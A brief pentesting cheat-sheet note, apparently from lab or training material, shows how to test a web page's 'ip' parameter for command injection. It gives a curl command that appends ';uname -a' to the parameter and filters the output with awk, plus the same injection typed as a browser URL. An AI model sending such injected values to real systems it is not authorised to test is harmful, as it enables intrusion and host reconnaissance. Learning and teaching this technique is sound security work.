# Curl

### If the web application is vulnerable to Command Injection...

### From a terminal this will filter Curl and only print the OS and architecture of the web application host.
```
curl http://<IP>/<Subdirectory>/example1.php?ip=";uname%20-a" 2>&1 | awk '/<pre>/{flag=1;next}/pre>/{flag=0}flag'
```
Alternatively you can also just enter "uname -a" directly into the web browser address bar in this format.
```
http://<IP>/<Subdirectory>/example1.php?ip=127.0.0.1;uname -a
```
